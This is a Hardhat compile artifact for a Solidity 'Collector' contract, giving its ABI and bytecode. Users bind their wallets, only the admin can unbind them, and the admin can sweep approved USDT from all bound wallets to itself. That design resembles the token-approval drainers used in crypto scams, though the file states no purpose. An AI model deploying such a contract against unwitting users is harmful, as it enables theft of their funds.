{
  "_format": "hh3-artifact-1",
  "contractName": "Collector",
  "sourceName": "contracts/Collector.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_usdt",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "previousAdmin",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "newAdmin",
          "type": "address"
        }
      ],
      "name": "AdminChanged",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "Collected",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "user",
          "type": "address"
        }
      ],
      "name": "WalletBound",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "user",
          "type": "address"
        }
      ],
      "name": "WalletUnbound",
      "type": "event"
    },
    {
      "inputs": [],
      "name": "admin",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "bindWallet",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "name": "boundWalletList",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "boundWallets",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "amountPerWallet",
          "type": "uint256"
        }
      ],
      "name": "collectAll",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "user",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "collectFromWallet",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getBoundWallets",
      "outputs": [
        {
          "internalType": "address[]",
          "name": "",
          "type": "address[]"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "newAdmin",
          "type": "address"
        }
      ],
      "name": "transferAdmin",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "user",
          "type": "address"
        }
      ],
      "name": "unbindWallet",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "usdt",
      "outputs": [
        {
          "internalType": "contract IERC20",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": "0x60a060405234801562000010575f80fd5b5060405162001b2e38038062001b2e833981810160405281019062000036919062000186565b5f73ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff1603620000a7576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016200009e9062000214565b60405180910390fd5b335f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508073ffffffffffffffffffffffffffffffffffffffff1660808173ffffffffffffffffffffffffffffffffffffffff16815250505062000234565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f620001508262000125565b9050919050565b620001628162000144565b81146200016d575f80fd5b50565b5f81519050620001808162000157565b92915050565b5f602082840312156200019e576200019d62000121565b5b5f620001ad8482850162000170565b91505092915050565b5f82825260208201905092915050565b7f55534454206164647265737320726571756972656400000000000000000000005f82015250565b5f620001fc601583620001b6565b91506200020982620001c6565b602082019050919050565b5f6020820190508181035f8301526200022d81620001ee565b9050919050565b6080516118b7620002775f395f81816103860152818161057e01528181610619015281816106d50152818161097c01528181610a5a0152610b3a01526118b75ff3fe608060405234801561000f575f80fd5b506004361061009c575f3560e01c806375829def1161006457806375829def146101425780639b8096191461015e5780639bbc57ff14610168578063f851a44014610186578063fc3045d7146101a45761009c565b80632746448c146100a05780632f48ab7d146100bc578063444f8249146100da578063689db1ca146100f65780636d3bfe7614610126575b5f80fd5b6100ba60048036038101906100b5919061110b565b6101d4565b005b6100c4610384565b6040516100d19190611191565b60405180910390f35b6100f460048036038101906100ef91906111dd565b6103a8565b005b610110600480360381019061010b919061110b565b610804565b60405161011d9190611222565b60405180910390f35b610140600480360381019061013b919061123b565b610821565b005b61015c6004803603810190610157919061110b565b610c8b565b005b610166610e41565b005b610170610fc4565b60405161017d9190611330565b60405180910390f35b61018e61104f565b60405161019b919061135f565b60405180910390f35b6101be60048036038101906101b991906111dd565b611072565b6040516101cb919061135f565b60405180910390f35b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610261576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610258906113d2565b60405180910390fd5b60015f8273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f205f9054906101000a900460ff166102ea576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016102e19061143a565b60405180910390fd5b5f60015f8373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f205f6101000a81548160ff0219169083151502179055508073ffffffffffffffffffffffffffffffffffffffff167fc5864d09e7d8153afa4f34c5756eb5cf2c641c32d863dfb45f54bada9e46d92a60405160405180910390a250565b7f000000000000000000000000000000000000000000000000000000000000000081565b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610435576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161042c906113d2565b60405180910390fd5b5f8111610477576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161046e906114a2565b60405180910390fd5b5f60028054806020026020016040519081016040528092919081815260200182805480156104f757602002820191905f5260205f20905b815f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190600101908083116104ae575b505050505090505f5b81518110156107ff575f82828151811061051d5761051c6114c0565b5b6020026020010151905060015f8273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f205f9054906101000a900460ff1661057b57506107ec565b5f7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff166370a08231836040518263ffffffff1660e01b81526004016105d5919061135f565b602060405180830381865afa1580156105f0573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906106149190611501565b90505f7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663dd62ed3e84306040518363ffffffff1660e01b815260040161067292919061152c565b602060405180830381865afa15801561068d573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906106b19190611501565b90505f869050808310806106c457508082105b156106d257505050506107ec565b5f7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff166323b872dd865f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff16856040518463ffffffff1660e01b815260040161074f93929190611562565b6020604051808303815f875af115801561076b573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061078f91906115c1565b905080156107e6578473ffffffffffffffffffffffffffffffffffffffff167f8c22f554c81b54107cd95e734e4ef45767214974a540f34ea4a4f8c3fc7b13c3836040516107dd91906115ec565b60405180910390a25b50505050505b80806107f790611632565b915050610500565b505050565b6001602052805f5260405f205f915054906101000a900460ff1681565b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146108ae576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016108a5906113d2565b60405180910390fd5b60015f8373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f205f9054906101000a900460ff16610937576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161092e9061143a565b60405180910390fd5b5f8111610979576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610970906114a2565b60405180910390fd5b5f7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff166370a08231846040518263ffffffff1660e01b81526004016109d3919061135f565b602060405180830381865afa1580156109ee573d5f803e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610a129190611501565b905081811015610a57576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610a4e906116c3565b60405180910390fd5b5f7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663dd62ed3e85306040518363ffffffff1660e01b8152600401610ab392919061152c565b602060405180830381865afa158015610ace573d5f803e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610af29190611501565b905082811015610b37576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610b2e9061172b565b60405180910390fd5b5f7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff166323b872dd865f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff16876040518463ffffffff1660e01b8152600401610bb493929190611562565b6020604051808303815f875af1158015610bd0573d5f803e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610bf491906115c1565b905080610c36576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610c2d90611793565b60405180910390fd5b8473ffffffffffffffffffffffffffffffffffffffff167f8c22f554c81b54107cd95e734e4ef45767214974a540f34ea4a4f8c3fc7b13c385604051610c7c91906115ec565b60405180910390a25050505050565b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610d18576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610d0f906113d2565b60405180910390fd5b5f73ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff1603610d86576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610d7d906117fb565b60405180910390fd5b8073ffffffffffffffffffffffffffffffffffffffff165f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167f7e644d79422f17c01e4894b5f4f588d331ebfa28653d42ae832dc59e38c9798f60405160405180910390a3805f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b60015f3373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f205f9054906101000a900460ff1615610ecb576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610ec290611863565b60405180910390fd5b6001805f3373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f205f6101000a81548160ff021916908315150217905550600233908060018154018082558091505060019003905f5260205f20015f9091909190916101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055503373ffffffffffffffffffffffffffffffffffffffff167f82e1d2a721d74c9e394ec732a60d27cc8968c631e423a6ed1048656c02a702a760405160405180910390a2565b6060600280548060200260200160405190810160405280929190818152602001828054801561104557602002820191905f5260205f20905b815f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019060010190808311610ffc575b5050505050905090565b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60028181548110611081575f80fd5b905f5260205f20015f915054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6110da826110b1565b9050919050565b6110ea816110d0565b81146110f4575f80fd5b50565b5f81359050611105816110e1565b92915050565b5f602082840312156111205761111f6110ad565b5b5f61112d848285016110f7565b91505092915050565b5f819050919050565b5f61115961115461114f846110b1565b611136565b6110b1565b9050919050565b5f61116a8261113f565b9050919050565b5f61117b82611160565b9050919050565b61118b81611171565b82525050565b5f6020820190506111a45f830184611182565b92915050565b5f819050919050565b6111bc816111aa565b81146111c6575f80fd5b50565b5f813590506111d7816111b3565b92915050565b5f602082840312156111f2576111f16110ad565b5b5f6111ff848285016111c9565b91505092915050565b5f8115159050919050565b61121c81611208565b82525050565b5f6020820190506112355f830184611213565b92915050565b5f8060408385031215611251576112506110ad565b5b5f61125e858286016110f7565b925050602061126f858286016111c9565b9150509250929050565b5f81519050919050565b5f82825260208201905092915050565b5f819050602082019050919050565b6112ab816110d0565b82525050565b5f6112bc83836112a2565b60208301905092915050565b5f602082019050919050565b5f6112de82611279565b6112e88185611283565b93506112f383611293565b805f5b8381101561132357815161130a88826112b1565b9750611315836112c8565b9250506001810190506112f6565b5085935050505092915050565b5f6020820190508181035f83015261134881846112d4565b905092915050565b611359816110d0565b82525050565b5f6020820190506113725f830184611350565b92915050565b5f82825260208201905092915050565b7f4e6f742061646d696e00000000000000000000000000000000000000000000005f82015250565b5f6113bc600983611378565b91506113c782611388565b602082019050919050565b5f6020820190508181035f8301526113e9816113b0565b9050919050565b7f4e6f7420626f756e6400000000000000000000000000000000000000000000005f82015250565b5f611424600983611378565b915061142f826113f0565b602082019050919050565b5f6020820190508181035f83015261145181611418565b9050919050565b7f416d6f756e74206973207a65726f0000000000000000000000000000000000005f82015250565b5f61148c600e83611378565b915061149782611458565b602082019050919050565b5f6020820190508181035f8301526114b981611480565b9050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52603260045260245ffd5b5f815190506114fb816111b3565b92915050565b5f60208284031215611516576115156110ad565b5b5f611523848285016114ed565b91505092915050565b5f60408201905061153f5f830185611350565b61154c6020830184611350565b9392505050565b61155c816111aa565b82525050565b5f6060820190506115755f830186611350565b6115826020830185611350565b61158f6040830184611553565b949350505050565b6115a081611208565b81146115aa575f80fd5b50565b5f815190506115bb81611597565b92915050565b5f602082840312156115d6576115d56110ad565b5b5f6115e3848285016115ad565b91505092915050565b5f6020820190506115ff5f830184611553565b92915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f61163c826111aa565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff820361166e5761166d611605565b5b600182019050919050565b7f496e73756666696369656e742062616c616e63650000000000000000000000005f82015250565b5f6116ad601483611378565b91506116b882611679565b602082019050919050565b5f6020820190508181035f8301526116da816116a1565b9050919050565b7f496e73756666696369656e7420616c6c6f77616e6365000000000000000000005f82015250565b5f611715601683611378565b9150611720826116e1565b602082019050919050565b5f6020820190508181035f83015261174281611709565b9050919050565b7f5472616e73666572206661696c656400000000000000000000000000000000005f82015250565b5f61177d600f83611378565b915061178882611749565b602082019050919050565b5f6020820190508181035f8301526117aa81611771565b9050919050565b7f5a65726f2061646d696e000000000000000000000000000000000000000000005f82015250565b5f6117e5600a83611378565b91506117f0826117b1565b602082019050919050565b5f6020820190508181035f830152611812816117d9565b9050919050565b7f416c726561647920626f756e64000000000000000000000000000000000000005f82015250565b5f61184d600d83611378565b915061185882611819565b602082019050919050565b5f6020820190508181035f83015261187a81611841565b905091905056fea264697066735822122087066f76cc5b0e76bd13b368aecb1fad4791d77ca5b0ea4c3cdf47c0f95eac9764736f6c63430008140033",
  "linkReferences": {},
  "deployedLinkReferences": {},
  "immutableReferences": {
    "44": [
      {
        "length": 32,
        "start": 902
      },
      {
        "length": 32,
        "start": 1406
      },
      {
        "length": 32,
        "start": 1561
      },
      {
        "length": 32,
        "start": 1749
      },
      {
        "length": 32,
        "start": 2428
      },
      {
        "length": 32,
        "start": 2650
      },
      {
        "length": 32,
        "start": 2874
      }
    ]
  },
  "inputSourceName": "project/contracts/Collector.sol",
  "buildInfoId": "solc-0_8_20-4c239f0a6251222a40cb9e49bcef39daf816b4f6"
}